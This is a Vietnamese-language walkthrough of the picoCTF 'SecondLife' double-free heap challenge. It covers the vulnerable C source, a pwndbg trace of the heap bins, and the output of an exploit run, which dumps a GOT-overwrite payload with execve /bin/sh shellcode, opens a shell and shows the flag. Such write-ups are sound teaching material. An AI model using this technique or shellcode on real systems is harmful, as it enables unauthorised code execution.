# PWN - SecondLife (400)


## Description
> Just pwn this [program](vuln) using a double free and get a flag. It's also found in /problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53 on the shell server. [Source](./vuln).


## Examination
Tương tự bài [AfterLife](../AfterLife/README.md). Ở đây ta cũng có 1 hàm win() để đọc flag, 1 hàm main() bao gồm nhiều lệnh malloc() và free(). Mục tiêu vẫn là gọi được hàm win().
Trước hết thử chạy chương trình:
```bash
root@pwn:/ctf/work/SecondLife# chmod +x vuln
root@pwn:/ctf/work/SecondLife# ./vuln
Oops! a new developer copy pasted and printed an address as a decimal...
146059272
asfasdf
You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...
23
Segmentation fault (core dumped)
```
Chương trình crash. Thử checksec:
```bash
pwndbg> checksec
[*] '/ctf/work/SecondLife/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
Checksec giống y chang bài [AfterLife](../AfterLife/README.md).


## Bugs
Source code in C:
```c
int main(int argc, char *argv[])
{
   //This is rather an artificial pieace of code taken from Secure Coding in c by Robert C. Seacord 
   char *first, *second, *third, *fourth;
   char *fifth, *sixth, *seventh;
   first=malloc(256);
   printf("Oops! a new developer copy pasted and printed an address as a decimal...\n");
   printf("%d\n",first);
   fgets(first, LINE_BUFFER_SIZE, stdin);
   second=malloc(256);
   third=malloc(256);
   fourth=malloc(256);
   free(first);
   free(third);
   fifth=malloc(128);
   free(first);
   sixth=malloc(256);
   puts("You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...");
   gets(sixth);
   seventh=malloc(256);
   exit(0);
}
```
Bài này có lỗi **Double Free** khi mà `free(first)` được gọi 2 lần.


## Prepare enviroment
Xem bài [AfterLife](../AfterLife/README.md)


## Debug
```bash
pwndbg> disass main
Dump of assembler code for function main:
   0x080489ff <+0>:     lea    ecx,[esp+0x4]
   0x08048a03 <+4>:     and    esp,0xfffffff0
   0x08048a06 <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048a09 <+10>:    push   ebp
   0x08048a0a <+11>:    mov    ebp,esp
   0x08048a0c <+13>:    push   ebx
   0x08048a0d <+14>:    push   ecx
   0x08048a0e <+15>:    sub    esp,0x20
   0x08048a11 <+18>:    call   0x8048890 <__x86.get_pc_thunk.bx>
   0x08048a16 <+23>:    add    ebx,0x45ea
   0x08048a1c <+29>:    sub    esp,0xc
   0x08048a1f <+32>:    push   0x100
   0x08048a24 <+37>:    call   0x8049389 <malloc>
   0x08048a29 <+42>:    add    esp,0x10
   0x08048a2c <+45>:    mov    DWORD PTR [ebp-0x24],eax
   0x08048a2f <+48>:    sub    esp,0xc
   0x08048a32 <+51>:    lea    eax,[ebx-0x2020]
   0x08048a38 <+57>:    push   eax
   0x08048a39 <+58>:    call   0x8048780 <puts@plt>
   0x08048a3e <+63>:    add    esp,0x10
   0x08048a41 <+66>:    sub    esp,0x8
   0x08048a44 <+69>:    push   DWORD PTR [ebp-0x24]
   0x08048a47 <+72>:    lea    eax,[ebx-0x1fd7]
   0x08048a4d <+78>:    push   eax
   0x08048a4e <+79>:    call   0x8048710 <printf@plt>
   0x08048a53 <+84>:    add    esp,0x10
   0x08048a56 <+87>:    mov    eax,DWORD PTR [ebx-0x8]
   0x08048a5c <+93>:    mov    eax,DWORD PTR [eax]
   0x08048a5e <+95>:    sub    esp,0x4
   0x08048a61 <+98>:    push   eax
   0x08048a62 <+99>:    push   0x14
   0x08048a64 <+101>:   push   DWORD PTR [ebp-0x24]
   0x08048a67 <+104>:   call   0x8048750 <fgets@plt>
   0x08048a6c <+109>:   add    esp,0x10
   0x08048a6f <+112>:   sub    esp,0xc
   0x08048a72 <+115>:   push   0x100
   0x08048a77 <+120>:   call   0x8049389 <malloc>
   0x08048a7c <+125>:   add    esp,0x10
   0x08048a7f <+128>:   mov    DWORD PTR [ebp-0x20],eax
   0x08048a82 <+131>:   sub    esp,0xc
   0x08048a85 <+134>:   push   0x100
   0x08048a8a <+139>:   call   0x8049389 <malloc>
   0x08048a8f <+144>:   add    esp,0x10
   0x08048a92 <+147>:   mov    DWORD PTR [ebp-0x1c],eax
   0x08048a95 <+150>:   sub    esp,0xc
   0x08048a98 <+153>:   push   0x100
   0x08048a9d <+158>:   call   0x8049389 <malloc>
   0x08048aa2 <+163>:   add    esp,0x10
   0x08048aa5 <+166>:   mov    DWORD PTR [ebp-0x18],eax
   0x08048aa8 <+169>:   sub    esp,0xc
   0x08048aab <+172>:   push   DWORD PTR [ebp-0x24]
   0x08048aae <+175>:   call   0x8049afd <free>
   0x08048ab3 <+180>:   add    esp,0x10
   0x08048ab6 <+183>:   sub    esp,0xc
   0x08048ab9 <+186>:   push   DWORD PTR [ebp-0x1c]
   0x08048abc <+189>:   call   0x8049afd <free>
   0x08048ac1 <+194>:   add    esp,0x10
   0x08048ac4 <+197>:   sub    esp,0xc
   0x08048ac7 <+200>:   push   0x80
   0x08048acc <+205>:   call   0x8049389 <malloc>
   0x08048ad1 <+210>:   add    esp,0x10
   0x08048ad4 <+213>:   mov    DWORD PTR [ebp-0x14],eax
   0x08048ad7 <+216>:   sub    esp,0xc
   0x08048ada <+219>:   push   DWORD PTR [ebp-0x24]
   0x08048add <+222>:   call   0x8049afd <free>
   0x08048ae2 <+227>:   add    esp,0x10
   0x08048ae5 <+230>:   sub    esp,0xc
   0x08048ae8 <+233>:   push   0x100
   0x08048aed <+238>:   call   0x8049389 <malloc>
   0x08048af2 <+243>:   add    esp,0x10
   0x08048af5 <+246>:   mov    DWORD PTR [ebp-0x10],eax
   0x08048af8 <+249>:   sub    esp,0xc
   0x08048afb <+252>:   lea    eax,[ebx-0x1fd0]
   0x08048b01 <+258>:   push   eax
   0x08048b02 <+259>:   call   0x8048780 <puts@plt>
   0x08048b07 <+264>:   add    esp,0x10
   0x08048b0a <+267>:   sub    esp,0xc
   0x08048b0d <+270>:   push   DWORD PTR [ebp-0x10]
   0x08048b10 <+273>:   call   0x8048730 <gets@plt>
   0x08048b15 <+278>:   add    esp,0x10
   0x08048b18 <+281>:   sub    esp,0xc
   0x08048b1b <+284>:   push   0x100
   0x08048b20 <+289>:   call   0x8049389 <malloc>
   0x08048b25 <+294>:   add    esp,0x10
   0x08048b28 <+297>:   mov    DWORD PTR [ebp-0xc],eax
   0x08048b2b <+300>:   sub    esp,0xc
   0x08048b2e <+303>:   push   0x0
   0x08048b30 <+305>:   call   0x8048790 <exit@plt>
End of assembler dump.
```
Tôi sẽ set break point tại các lệnh quan trọng của hàm main() để xem quá trình cấp phát bộ nhớ heap diễn ra như thế nào.
```bash
pwndbg> b *main+37
Breakpoint 1 at 0x8048a24
pwndbg> b *main+120
Breakpoint 2 at 0x8048a77
pwndbg> b *main+139
Breakpoint 3 at 0x8048a8a
pwndbg> b *main+158
Breakpoint 4 at 0x8048a9d
pwndbg> b *main+175
Breakpoint 5 at 0x8048aae
pwndbg> b *main+189
Breakpoint 6 at 0x8048abc
pwndbg> b *main+205
Breakpoint 7 at 0x8048acc
pwndbg> b *main+222
Breakpoint 8 at 0x8048add
pwndbg> b *main+238
Breakpoint 9 at 0x8048aed
pwndbg> b *main+273
Breakpoint 10 at 0x8048b10
pwndbg> b *main+289
Breakpoint 11 at 0x8048b20
pwndbg> b *main+305
Breakpoint 12 at 0x8048b30
```
Giờ thì thử run chương trình:
```bash
pwndbg> r
Starting program: /ctf/work/SecondLife/vuln 
warning: Error disabling address space randomization: Operation not permitted

Breakpoint 1, 0x08048a24 in main ()
```
Breakpoint 1 nằm ngay trước lệnh malloc() đầu tiên. Cấu trúc stack lúc này:
```bash
pwndbg> x/20x $esp
0xffe4d4b0: 0x00000100  0xf7f43000  0x00000000  0x08048a16
0xffe4d4c0: 0xf7f433fc  0x00000000  0xffe4d59c  0x0804af7b
0xffe4d4d0: 0x00000001  0xffe4d594  0xffe4d59c  0x0804af51
0xffe4d4e0: 0xffe4d500  0x00000000  0x00000000  0xf7d83e81
0xffe4d4f0: 0xf7f43000  0xf7f43000  0x00000000  0xf7d83e81
pwndbg> p $ebp
$1 = (void *) 0xffe4d4e8
```
Đọc assembly của hàm main() ta sẽ biết được vị trí của các biến `first`, `second`, ...
```
first: 		ebp-0x24	0xffe4d4c4
second: 	   ebp-0x20	0xffe4d4c8
third: 		ebp-0x1c	0xffe4d4cc
fourth:  	ebp-0x18	0xffe4d4d0
fifth: 		ebp-0x14	0xffe4d4d4
seventh: 	ebp-0x10	0xffe4d4d8
```
Cho chương trình chạy tiếp tới breakpoint thứ 2, ngay trước câu lệnh malloc() thứ 2.
```bash
pwndbg> c
Continuing.
Oops! a new developer copy pasted and printed an address as a decimal...
142368776
AAAABBBBCCCCDDDD

Breakpoint 2, 0x08048a77 in main ()
```
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0xffe4d59c  0x0804af7b  0x00000001
0xffe4d4d4: 0xffe4d594  0xffe4d59c  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x41414141  0x42424242
0x87c6010:  0x43434343  0x44444444  0x0000000a  0x00000000
0x87c6020:  0x00000000  0x00000000
```
Chương trình cấp phát một chunk nhớ kích thước 0x108 = 264 bytes cho `first`. 

Tương tại bài trước, ta cũng được leak 1 địa chỉ tại Heap:
```python
>>> hex(142368776)
'0x87c6008'
```
Tôi sẽ cho chương trình chạy tới breakpoint thứ 5 ngay trước hàm free() đầu tiên, lúc này chương trình đã thực hiện xong 4 lệnh malloc().
```bash
pwndbg> c
Continuing.

Breakpoint 5, 0x08048aae in main ()
```
Cấu trúc Stack và Heap lúc này:
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0x087c6920  0x087c6a28  0x087c6b30
0xffe4d4d4: 0xffe4d594  0xffe4d59c  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x41414141  0x42424242
0x87c6010:  0x43434343  0x44444444  0x0000000a  0x00000000
0x87c6020:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6918
0x87c6918:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6928:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6938:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6a20
0x87c6a20:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6a30:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6a40:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6b28
0x87c6b28:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6b38:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6b48:  0x00000000  0x00000000
```
Bộ nhớ đã cấp phát 4 chunk nhớ kích thước 0x108 bytes cho 4 biến. 
Giờ ta sẽ đi đến break point thứ 7, sau khi chương trình đã thực hiện 2 lệnh free().
```bash
pwndbg> c
Continuing.

Breakpoint 7, 0x08048acc in main ()
```
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0x087c6920  0x087c6a28  0x087c6b30
0xffe4d4d4: 0xffe4d594  0xffe4d59c  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x0804d0b4  0x087c6a20
0x87c6010:  0x43434343  0x44444444  0x0000000a  0x00000000
0x87c6020:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6108
0x87c6108:  0x00000108  0x00000408  0x33323431  0x37373836
0x87c6118:  0x20770a36  0x65766564  0x65706f6c  0x6f632072
0x87c6128:  0x70207970  0x65747361
pwndbg> x/10x 0x087c6918
0x87c6918:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6928:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6938:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6a20
0x87c6a20:  0x00000000  0x00000109  0x087c6000  0x0804d0b4
0x87c6a30:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6a40:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6b28
0x87c6b28:  0x00000108  0x00000108  0x00000000  0x00000000
0x87c6b38:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6b48:  0x00000000  0x00000000
```
Lúc này, 2 chunk được free() sẽ được đẩy vào small bins:
```bash
smallbins
0x110: 0x087c6a20 -> 0x87c6000 <- 0x0804d0b4
```
Giờ tôi sẽ đi đến breakpoint thứ 8, sau khi gọi `fifth = malloc(128)`
```bash
pwndbg> c
Continuing.

Breakpoint 8, 0x08048add in main ()
```
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0x087c6920  0x087c6a28  0x087c6b30
0xffe4d4d4: 0x087c6a28  0xffe4d59c  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x0804d1ac  0x0804d1ac
0x87c6010:  0x43434343  0x44444444  0x0000000a  0x00000000
0x87c6020:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6108
0x87c6108:  0x00000108  0x00000408  0x33323431  0x37373836
0x87c6118:  0x20770a36  0x65766564  0x65706f6c  0x6f632072
0x87c6128:  0x70207970  0x65747361
pwndbg> x/10x 0x087c6918
0x87c6918:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6928:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6938:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6a20
0x87c6a20:  0x00000000  0x00000089  0x0804d1ac  0x087c6000
0x87c6a30:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6a40:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6aa8
0x87c6aa8:  0x00000000  0x00000081  0x0804d0b4  0x0804d0b4
0x87c6ab8:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6ac8:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6b28
0x87c6b28:  0x00000080  0x00000108  0x00000000  0x00000000
0x87c6b38:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6b48:  0x00000000  0x00000000
```
Mọi thứ hoàn toàn tương tự bài trước.
Lúc này cấu trúc của small bins:
```bash
smallbins
0x110: 0x087c6000 <- 0x0804d1ac
0x80 : 0x087c6aa8 <- 0x0804d0b4
```
Giờ thì bắt đầu có sự khác biệt. Ta đi tới breakpoint thứ 9, sau khi gọi `free(first)` 2 lần, gây lỗi **Double Free**.
```bash
pwndbg> c
Continuing.

Breakpoint 9, 0x08048aed in main ()
```
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0x087c6920  0x087c6a28  0x087c6b30
0xffe4d4d4: 0x087c6a28  0xffe4d59c  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x087c6aa8  0x0804d0b4
0x87c6010:  0x43434343  0x44444444  0x0000000a  0x00000000
0x87c6020:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6108
0x87c6108:  0x00000108  0x00000408  0x33323431  0x37373836
0x87c6118:  0x20770a36  0x65766564  0x65706f6c  0x6f632072
0x87c6128:  0x70207970  0x65747361
pwndbg> x/10x 0x087c6918
0x87c6918:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6928:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6938:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6a20
0x87c6a20:  0x00000000  0x00000089  0x0804d1ac  0x087c6000
0x87c6a30:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6a40:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6aa8
0x87c6aa8:  0x00000000  0x00000081  0x0804d0b4  0x087c6000
0x87c6ab8:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6ac8:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6b28
0x87c6b28:  0x00000080  0x00000108  0x00000000  0x00000000
0x87c6b38:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6b48:  0x00000000  0x00000000
```
Lúc này small bins như sau:
```bash
smallbins
0x110: 0x087c6000 -> 0x087c6aa8 -> 0x0804d0b4
```
Lúc này bộ nhớ bị lừa ...

Giờ ta đi đến breakpoint thứ 10, sau khi gọi `sixth=malloc(256);`
```bash
pwndbg> c
Continuing.
You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...

Breakpoint 10, 0x08048b10 in main ()
```
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0x087c6920  0x087c6a28  0x087c6b30
0xffe4d4d4: 0x087c6a28  0x087c6008  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x0804d0b4  0x0804d0b4
0x87c6010:  0x43434343  0x44444444  0x0000000a  0x00000000
0x87c6020:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6108
0x87c6108:  0x00000108  0x00000409  0x20756f59  0x756f6873
0x87c6118:  0x6520646c  0x7265746e  0x65687420  0x746f6720
0x87c6128:  0x646e6120  0x65687420
pwndbg> x/10x 0x087c6918
0x87c6918:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6928:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6938:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6a20
0x87c6a20:  0x00000000  0x00000089  0x0804d1ac  0x087c6000
0x87c6a30:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6a40:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6aa8
0x87c6aa8:  0x00000000  0x00000081  0x0804d12c  0x0804d12c
0x87c6ab8:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6ac8:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6b28
0x87c6b28:  0x00000080  0x00000108  0x00000000  0x00000000
0x87c6b38:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6b48:  0x00000000  0x00000000
```
Bộ nhớ đã lấy chunk **0x087c6000** cấp phát cho `sixth`. Lúc này `first` và `sixth` cùng trỏ tới 1 chunk. Do đó khi ta ghi vào `sixth` cũng đồng nghĩa với ghi vào `first`.

Small bins lúc này:
```bash
smallbins
0x110: 0x087c6000 -> 0x0804d0b4
0x88 : 0x087c6aa8 -> 0x0804d12c
```
Giờ tôi sẽ đi tiếp tới breakpoint thứ 11 sau lệnh `gets(sixth)`.
```bash
pwndbg> c
Continuing.
aaaabbbbccccddddeeeeffffgggghhhh

Breakpoint 11, 0x08048b20 in main ()
```
```bash
pwndbg> x/10x $ebp-0x24
0xffe4d4c4: 0x087c6008  0x087c6920  0x087c6a28  0x087c6b30
0xffe4d4d4: 0x087c6a28  0x087c6008  0x0804af51  0xffe4d500
0xffe4d4e4: 0x00000000  0x00000000
pwndbg> x/10x 0x087c6000
0x87c6000:  0x00000000  0x00000109  0x61616161  0x62626262
0x87c6010:  0x63636363  0x64646464  0x65656565  0x66666666
0x87c6020:  0x67676767  0x68686868
pwndbg> x/10x 0x087c6108
0x87c6108:  0x00000108  0x00000409  0x20756f59  0x756f6873
0x87c6118:  0x6520646c  0x7265746e  0x65687420  0x746f6720
0x87c6128:  0x646e6120  0x65687420
pwndbg> x/10x 0x087c6918
0x87c6918:  0x00000000  0x00000109  0x00000000  0x00000000
0x87c6928:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6938:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6a20
0x87c6a20:  0x00000000  0x00000089  0x0804d1ac  0x087c6000
0x87c6a30:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6a40:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6aa8
0x87c6aa8:  0x00000000  0x00000081  0x0804d12c  0x0804d12c
0x87c6ab8:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6ac8:  0x00000000  0x00000000
pwndbg> x/10x 0x087c6b28
0x87c6b28:  0x00000080  0x00000108  0x00000000  0x00000000
0x87c6b38:  0x00000000  0x00000000  0x00000000  0x00000000
0x87c6b48:  0x00000000  0x00000000
```
Sau khi đi qua lệnh malloc(256) cuối cùng, bộ nhớ sẽ cấp phats chunk **0x087c6000** cho `seventh`. Đến đây cách exploit hoàn toàn giống với bài trước.


## Exploit
[Source exploit](ex.py)

```bash
...
...
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-fVt8Yw/step2 /tmp/pwn-asm-fVt8Yw/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-fVt8Yw/step3 /tmp/pwn-asm-fVt8Yw/step4
[DEBUG] Sent 0x2 bytes:
    'A\n'
[DEBUG] Received 0x75 bytes:
    'You should enter the got and the shellcode address in some specific manner... an overflow will not be very useful...\n'
[DEBUG] Sent 0x42 bytes:
    00000000  20 d0 04 08  10 10 20 09  eb 0b 90 90  90 90 90 90  │ ···│·· ·│····│····│
    00000010  90 90 90 90  90 6a 68 68  2f 2f 2f 73  68 2f 62 69  │····│·jhh│///s│h/bi│
    00000020  6e 89 e3 68  01 01 01 01  81 34 24 72  69 01 01 31  │n··h│····│·4$r│i··1│
    00000030  c9 51 6a 04  59 01 e1 51  89 e1 31 d2  6a 0b 58 cd  │·Qj·│Y··Q│··1·│j·X·│
    00000040  80 0a                                               │··│
    00000042
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x16 bytes:
    'flag.txt  vuln\tvuln.c\n'
flag.txt  vuln    vuln.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    'cat flag.txt\n'
[DEBUG] Received 0x1e bytes:
    'picoCTF{HeapHeapFlag_8342a39b}'
picoCTF{HeapHeapFlag_8342a39b}$  
```